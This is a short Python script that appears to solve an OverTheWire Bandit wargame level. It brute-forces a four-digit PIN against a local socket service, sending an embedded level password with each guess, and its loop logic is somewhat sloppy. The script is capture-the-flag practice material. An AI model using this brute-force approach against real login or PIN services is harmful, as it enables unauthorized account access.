#!/usr/bin/python3
import socket
import sys
import time

prefix = "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"

def generate_pin():
    temp_pin = []
    for a in range(10):
        for b in range(10):
            for c in range(10):
                for d in range(10):
                    pin = f"{a}{b}{c}{d}"

                    temp_pin.append(pin)
    return temp_pin

pin_list = generate_pin()
pin_list_reverse = pin_list[::-1] # reverse the list, and start from the end using Thread-2 so that it will be faster
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
address = ("localhost", 30002)
client.connect(address)
i = 0
try:

    while True:
        message = client.recv(1024).decode()

        craft = f"{prefix}  {pin_list[i]}".encode()
        failure_message = ["Wrong! Please enter the correct pincode. Try again.", "Fail! You did not supply enough data. Try again.", "I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space."]
        client.send(craft)
        client.send("\n".encode())
        if "Correct!" in message:
            print("[+]", message)
        print("[-] Trying : >> ", craft.decode())
        # if message in failure_message:
            # client.send(craft)
            # client.send("\n".encode())
            # print(craft.decode())
        # else:
            # print(message)
            # break
        i += 1


except Exception as e:
    print("An Error occured : ", e)
    sys.exit(1)

finally:
    client.close()